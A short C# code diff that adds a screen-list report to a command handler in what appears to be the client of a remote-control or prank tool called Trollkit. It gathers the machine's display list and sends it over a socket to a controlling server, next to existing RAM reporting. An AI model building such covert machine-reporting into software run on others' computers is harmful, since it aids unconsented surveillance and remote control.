@@ -123,6 +123,18 @@ namespace Trollkit_Client.Modules.CommandHandlers
 				BConsole.WriteLine("RAM error: " + e.Message, ConsoleColor.Red);
 			}
 
+			try
+			{
+				string screens = Screenshot.GetScreenList();
+				TransferCommandObject ramTransferObject = new TransferCommandObject { Command = "ScreenList", Value = screens };
+				SendResponseObjectToSocket(s, ClientServerPipeline.BufferSerialize(ramTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("ScreenList error: " + e.Message, ConsoleColor.Red);
+			}
+
 			return success;
 		}
 		
